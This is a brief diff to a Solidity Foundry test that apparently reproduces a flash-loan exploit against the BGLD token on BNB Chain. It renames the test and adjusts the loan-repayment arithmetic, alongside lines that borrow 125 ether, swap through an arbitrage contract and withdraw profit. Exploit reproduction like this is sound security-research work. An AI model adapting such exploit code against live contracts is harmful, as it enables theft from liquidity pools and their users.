@@ -66,7 +66,7 @@ contract BGLDPocTest is Test {
         arbitrage.run(data);
     }
 
-    function testBGLDPocByOwner() public {
+    function testPocBGLD() public {
         uint256 lend_amount = 125 ether;
         (uint256 reverse0, uint256 reverse1, ) = lp.getReserves();
         address wbnb = lp.token0();
@@ -108,7 +108,7 @@ contract BGLDPocTest is Test {
             swap_in * (100 + fee.total) / 100, swap_out - 0.1 ether, path, address(arbitrage), block.timestamp
         ));
         // repay loan
-        uint256 repay_amount = lend_amount * 1003 / 1000;
+        uint256 repay_amount = lend_amount + lend_amount * 25 / (10000 - 25) + 1 wei;
         payloads[7] = abi.encode(wbnb, 0, abi.encodeWithSignature("transfer(address,uint256)", address(lender), repay_amount));
         // withdraw bnb
         uint256 income_min = swap_out - 0.1 ether - repay_amount;
